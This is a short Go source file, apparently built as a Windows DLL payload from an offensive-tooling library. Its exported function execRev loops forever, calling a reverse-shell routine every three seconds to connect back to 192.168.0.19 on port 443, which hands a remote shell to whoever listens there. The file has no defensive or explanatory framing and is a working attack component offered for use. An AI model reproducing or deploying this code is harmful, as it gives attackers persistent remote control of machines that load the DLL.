package main

import "C"
import (
	"time"

	rev_shell "github.com/MrTuxx/OffensiveGolang/pkg/payloads/rev_shell/rev_shell_dll"
)

//export execRev
func execRev() {
	for {
		time.Sleep(3 * time.Second)
		rev_shell.SendDllShell("192.168.0.19", 443)
	}
}

func main() {
	//Blank
}
